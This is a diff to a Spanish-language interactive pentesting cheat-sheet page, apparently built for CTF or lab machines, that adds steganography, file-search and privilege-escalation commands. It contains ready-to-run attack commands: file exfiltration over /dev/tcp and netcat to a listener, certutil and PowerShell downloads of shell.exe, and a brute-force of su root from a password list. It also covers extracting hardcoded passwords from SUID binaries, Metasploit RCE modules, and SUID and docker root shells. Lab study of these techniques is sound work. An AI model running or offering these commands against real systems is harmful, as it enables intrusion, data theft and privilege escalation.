@@ -210,9 +210,9 @@
 // fase, descripción, [qué hace], comando({IP})
 const D = [
   // ===== 1. Descubrimiento de red =====
-  ["discovery","Hosts vivos en la subred","-sn hace solo ping scan, sin escanear puertos: lista qué IPs responden en la /24","nmap -sn {IP} -oN hosts"],
+  ["discovery","Hosts vivos en la subred","-sn hace solo ping scan, sin escanear puertos: lista qué IPs responden en la /24","nmap -sn 10.10.10.0/24 -oN hosts"],
   ["discovery","Descubrimiento por ARP","envía peticiones ARP a toda la interfaz local; detecta hosts que ignoran el ping","arp-scan -l"],
-  ["discovery","Hosts vivos con ping del sistema","barrido rápido por si nmap no está a mano","for i in $(seq 1 254); do ping -c1 -W1 {IP} | grep 'bytes from'; done"],
+  ["discovery","Hosts vivos con ping del sistema","barrido rápido por si nmap no está a mano","for i in $(seq 1 254); do ping -c1 -W1 10.10.10.$i | grep 'bytes from'; done"],
 
   // ===== 2. Escaneo de puertos =====
   ["scan","Escaneo completo (tu plantilla)","-p- los 65535 puertos, -sS SYN scan, -sC scripts por defecto, -sV versiones, -Pn sin ping previo","sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vvv -Pn {IP} -oN escaneo"],
@@ -225,7 +225,7 @@ const D = [
   // ===== 3. Web =====
   ["web","Escaneo de vulnerabilidades web","Nikto prueba miles de rutas y fallos conocidos (ficheros peligrosos, versiones vulnerables)","nikto -h http://{IP}"],
   ["web","Fuzzing de directorios y ficheros","dirb prueba cada palabra del diccionario como ruta para descubrir contenido oculto","dirb http://{IP} /usr/share/wordlists/dirb/common.txt"],
-  ["web","Fuzzing de rutas con ffuf","FUZZ marca dónde se prueba cada palabra; -c colorea la salida","ffuf -u http://{IP}/FUZZ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -c"],
+  ["web","Fuzzing de rutas con ffuf","FUZZ marca dónde se prueba cada palabra; -c colorea la salida","ffuf -u http://{IP}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c"],
   ["web","Fuzzing probando extensiones","-e añade cada extensión a cada palabra: busca admin.php, backup.txt, etc.","ffuf -u http://{IP}/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.html,.bak -c"],
   ["web","Descubrir vhosts por cabecera Host","fuzzea el Host HTTP; -fs 0 oculta respuestas vacías para ver solo los que existen","ffuf -u http://{IP}/ -H 'Host: FUZZ.target' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0"],
   ["web","Identificar la tecnología del sitio","whatweb detecta servidor, CMS, lenguaje y versiones a partir de las respuestas","whatweb http://{IP}"],
@@ -304,7 +304,16 @@ const D = [
   ["crack","Preparar una clave SSH cifrada","convierte la id_rsa a formato crackeable por John","ssh2john id_rsa > id_rsa.hash"],
   ["crack","Crackear ZIP protegido","saca el hash del zip y lo pasa a John","zip2john fichero.zip > zip.hash"],
 
-  // ===== 14. Metasploit =====
+  // ===== 14. Esteganografía / forense =====
+  ["stego","Fuerza bruta sobre stegsnow","prueba cada palabra de rockyou como clave del texto oculto en un fichero","for p in $(cat /usr/share/wordlists/rockyou.txt); do stegsnow -C -p \"$p\" fichero.txt 2>/dev/null | grep -q . && echo \"clave: $p\" && break; done"],
+  ["stego","Extraer datos ocultos con stegsnow","-C descifra; -p la contraseña ya conocida","stegsnow -C -p 'clave' fichero.txt"],
+  ["stego","Extraer datos ocultos de una imagen","steghide saca ficheros incrustados en jpg/bmp/wav","steghide extract -sf imagen.jpg"],
+  ["stego","Cadenas legibles de un binario o fichero","strings revela credenciales o rutas embebidas en binarios","strings binario | less"],
+  ["stego","Ver metadatos de un fichero","exiftool muestra autor, comentarios y datos ocultos en cabeceras","exiftool imagen.jpg"],
+  ["stego","Identificar el tipo real de un fichero","file detecta el formato aunque la extensión mienta","file fichero"],
+  ["stego","Buscar ficheros embebidos","binwalk detecta y extrae archivos incrustados dentro de otro","binwalk -e fichero"],
+
+  // ===== 15. Metasploit =====
   ["msf","Abrir la consola de Metasploit","-q arranca sin el banner de inicio","msfconsole -q"],
   ["msf","Buscar un módulo","filtra los módulos disponibles por nombre de servicio o CVE","search openfire"],
   ["msf","Cargar un módulo","use selecciona el módulo; a partir de ahí se configuran sus opciones","use exploit/multi/http/openfire_auth_bypass_rce"],
@@ -336,6 +345,7 @@ const D = [
   ["transfer","Descargar con curl","-o guarda con el nombre indicado","curl http://{IP}:8000/linpeas.sh -o linpeas.sh"],
   ["transfer","Recibir un fichero con netcat","en tu Kali escuchas y guardas lo que llega","nc -lvnp 9001 > fichero"],
   ["transfer","Enviar un fichero con netcat","desde la víctima lo mandas a tu listener","nc {IP} 9001 < fichero"],
+  ["transfer","Exfiltrar por /dev/tcp (sin nc)","cuando no hay netcat: escucha con nc -lvnp 9000 > out y ejecuta esto en la víctima","cat fichero > /dev/tcp/{IP}/9000"],
   ["transfer","Descargar en Windows (certutil)","binario nativo de Windows para bajar ficheros","certutil -urlcache -f http://{IP}:8000/shell.exe shell.exe"],
   ["transfer","Descargar en Windows (PowerShell)","IWR baja el fichero sin herramientas extra","powershell -c \"iwr http://{IP}:8000/shell.exe -o shell.exe\""],
 
@@ -353,6 +363,8 @@ const D = [
   ["post","Ver la tabla de rutas","muestra a qué otras subredes puede llegar este host","ip route"],
   ["post","Puertos en escucha","servicios internos que solo se ven desde dentro de la máquina","ss -tulpn"],
   ["post","Buscar credenciales en ficheros","-r recursivo, -n con número de línea; rastrea contraseñas en configs y webs","grep -rniE 'password|passwd|secret' /var/www 2>/dev/null"],
+  ["post","Buscar ficheros de un grupo concreto","-group localiza ficheros accesibles por tu grupo (p. ej. www-data)","find / -group www-data 2>/dev/null | grep -v /proc"],
+  ["post","Buscar ficheros de un usuario","-user encuentra lo que pertenece a un usuario objetivo","find / -user punky 2>/dev/null"],
   ["post","Ver el historial de comandos","a menudo hay contraseñas o rutas tecleadas por el usuario","cat ~/.bash_history"],
   ["post","Leer los usuarios del sistema","/etc/passwd lista las cuentas; busca las que tienen shell","cat /etc/passwd"],
 
@@ -376,6 +388,8 @@ const D = [
   ["privesc","Escalada vía env con SUID","si env tiene el bit SUID, lanza una shell manteniendo privilegios (-p)","./env /bin/sh -p"],
   ["privesc","Shell root si bash es SUID","-p conserva el usuario efectivo root en lugar de degradar a tu usuario","bash -p"],
   ["privesc","Ver versión del kernel","para buscar exploits de kernel si no hay otro vector","uname -a"],
+  ["privesc","Fuerza bruta de su root con una lista","prueba cada contraseña contra su root hasta dar con la de root","while read p; do echo \"$p\" | timeout 2 su root -c 'id' 2>/dev/null | grep -q uid=0 && echo \"ROOT: $p\" && break; done < passwords.txt"],
+  ["privesc","Extraer contraseñas de un binario SUID","strings sobre el binario privilegiado revela credenciales hardcodeadas","strings /usr/local/bin/task_manager | grep -iE 'pass|pwd|key'"],
   ["privesc","Escalada por grupo docker","si estás en el grupo docker, montas la raíz del host como root","docker run -v /:/mnt --rm -it alpine chroot /mnt sh"],
 
   // ===== 22. Escalada de privilegios (Windows) =====
@@ -400,6 +414,7 @@ const META = {
   webexp:{n:"web ofensiva",c:"var(--amber)"},
   brute:{n:"fuerza bruta",c:"var(--amber)"},
   crack:{n:"cracking de hashes",c:"var(--amber)"},
+  stego:{n:"esteganografía / forense (stego)",c:"var(--amber)"},
   msf:{n:"metasploit",c:"var(--amber)"},
   payload:{n:"payloads (msfvenom)",c:"var(--amber)"},
   access:{n:"acceso / shells",c:"var(--red)"},
@@ -459,7 +474,7 @@ ipEl.addEventListener("input",render);
 const COPY_ICON=`<svg viewBox="0 0 24 24"><rect x="9" y="9" width="11" height="11" rx="2"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>`;
 const CHECK_ICON=`<svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg>`;
 
-const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|docker|uname|for|rm|mkfifo|echo|put|get|sqlmap)\b/;
+const TOOLS=/^(sudo\s+)?(nmap|ffuf|dirb|nikto|whatweb|wpscan|smbclient|smbget|crackmapexec|enum4linux|snmpwalk|searchsploit|hydra|msfconsole|msfvenom|nc|ncat|bash|sh|php|python3?|wget|curl|chisel|socat|proxychains|arp-scan|find|getcap|stty|script|export|grep|cat|id|ip|ss|ftp|dig|dnsenum|mysql|impacket-mssqlclient|xfreerdp|ldapsearch|showmount|mount|smtp-user-enum|hashid|hashcat|john|ssh2john|zip2john|ssh|certutil|powershell|systeminfo|whoami|winpeas|findstr|wmic|docker|uname|for|while|rm|mkfifo|echo|put|get|sqlmap|stegsnow|steghide|strings|exiftool|file|binwalk)\b/;
 
 function esc(s){return s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}
 function applyIP(cmd){
